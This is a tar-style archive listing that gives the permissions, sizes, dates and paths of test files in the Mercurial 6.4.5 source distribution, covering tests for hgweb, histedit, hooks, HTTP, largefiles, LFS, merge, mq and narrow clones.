--rw-r--r--   0 alphare   (1000) alphare   (1000)    33421 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-diffs.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11671 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-empty.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55770 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-filelog.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2586 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-head.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    52934 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-json.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3974 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-no-path-info.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4554 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-no-request-uri.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2682 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-non-interactive.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7427 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-raw.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7184 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-removed.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    66313 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb-symrev.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25486 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgweb.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1310 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgwebdir-gc.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1135 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgwebdir-paths.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55395 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgwebdir.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1650 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hgwebdirsym.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    38679 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-highlight.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16047 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-arguments.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7495 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-base.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4868 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-bookmark-motion.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14894 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-commute.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4253 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-drop.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13888 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-edit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8748 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-fold-non-commute.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15025 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-fold.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2109 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-merge-tools.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2109 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-no-backup.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6771 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-no-change.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4855 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-non-commute-abort.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8643 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-non-commute.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16204 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-obsolete.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4253 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-outgoing.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1658 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-histedit-templates.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    40527 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hook.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3424 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hooklib-changeset_obsoleted.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2586 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hooklib-changeset_published.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1332 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hooklib-enforce_draft_commits.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2383 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hooklib-reject_merge_commits.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1443 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hooklib-reject_new_heads.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    73170 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-bad-server.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3037 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-branchmap.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15583 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-bundle1.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4808 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-clone-r.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36449 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-permissions.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26308 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-protocol.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6588 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http-proxy.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24997 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-http.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26423 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-https.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    55194 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-hybridencode.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2011 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-i18n.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3622 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-identify.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1997 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-impexp-branch.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9395 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import-bypass.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2458 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import-context.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3704 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import-eol.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20483 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import-git.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4326 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import-merge.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1410 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import-unknown.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    46738 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-import.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4550 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-imports-checker.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12486 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-incoming-outgoing.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11558 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-infinitepush-bundlestore.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11925 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-infinitepush-ci.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5503 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-infinitepush.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5190 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-inherit-mode.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8091 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-init.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11932 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-install.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1089.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      758 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1102.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1942 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1175.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2172 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1306.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      384 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1438.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1186 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1502.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1637 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1802.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1124 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1877.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1192 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue1993.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1580 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue2137.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10113 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue3084.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      539 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue4074.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1471 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue522.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2023 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue586.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      658 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue5979.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      634 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue612.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      766 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue619.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19399 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue6528.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2291 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue660.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      964 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue6642.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2935 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue672.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      742 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-issue842.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1223 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-journal-exists.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4778 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-journal-share.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9065 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-journal.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32361 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-keyword.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1278 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-known.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7955 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-largefiles-cache.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33975 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-largefiles-misc.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2057 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-largefiles-small-disk.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26281 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-largefiles-update.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13520 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-largefiles-wireproto.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    51951 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-largefiles.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1032 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-legacy-exit-code.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13714 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfconvert.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2848 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-bundle.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11706 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-largefiles.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1190 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-pointer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      850 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-pointer.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30811 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-serve-access.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27515 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-serve.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36644 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs-test-server.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    42071 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lfs.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7649 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-linelog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7590 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-linerange.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      122 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-locale.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2323 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-locate.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4236 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lock-badness.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6026 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lock.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4833 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-log-bookmark.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1642 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-log-exthook.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18865 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-log-linerange.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    68329 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-log.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14206 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-logexchange.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3530 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-logtoprocess.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10794 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-lrucachedict.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3199 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mac-packages.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      980 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mactext.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2382 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mailmap.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      752 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-manifest-merging.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15640 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-manifest.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12481 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-manifest.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    44127 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-match.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      567 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mdiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    40965 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-changedelete.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2313 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-closedheads.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1918 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-combination-exec-bytes.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2274 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-combination-file-content.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1676 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-combination-misc.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5133 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-commit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32155 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-criss-cross.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4851 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-default.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8918 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-exec.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    34758 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-force.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4777 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-halt.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3361 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-internal-tools-pattern.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3449 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-local.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10097 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-no-file-change.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9347 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-partial-tool.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2360 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-remove.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1369 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-revert.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1917 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-revert2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3860 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-subrepos.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1554 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-symlinks.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    50588 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-tools.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13943 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge-types.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11059 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge1.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1499 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge10.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1215 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge2.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1897 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge4.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      853 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge5.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1940 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge6.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3847 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge7.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      727 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge8.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1735 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-merge9.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1254 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-minifileset.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5523 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-minirst.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    21558 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-minirst.py.out
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1288 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-missing-capability.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4378 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-eol.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4771 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-git.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10778 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-guards.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17910 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-header-date.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20216 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-header-from.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3470 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-merge.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3570 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-missingfiles.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2933 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-pull-from-bundle.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4092 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qclone-http.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3561 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qdelete.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2507 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qdiff.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4831 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qfold.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1464 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qgoto.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      772 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qimport-fail-cleanup.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7753 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qimport.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8431 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qnew.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5559 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qpush-exact.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9769 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qpush-fail.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2771 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qqueue.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8592 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qrefresh-interactive.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7908 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qrefresh-replace-log-message.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8796 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qrefresh.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1862 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qrename.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      256 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-qsave.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4935 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-safety.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1054 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-subrepo-svn.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15369 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-subrepo.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1835 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq-symlinks.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31781 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mq.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22377 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-mv-cp-st-diff.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1883 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-acl.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      803 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-archive.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3683 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-clone-no-ellipsis.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2035 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-clone-non-narrow-server.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4410 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-clone-nonlinear.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2308 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-clone-stream.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7096 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-clone.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2938 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-commit.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1938 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-copies.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1644 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-debugcommands.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)      910 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-debugrebuilddirstate.t
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5903 2023-06-22 09:18:26.000000 mercurial-6.4.5/tests/test-narrow-exchange-merges.t
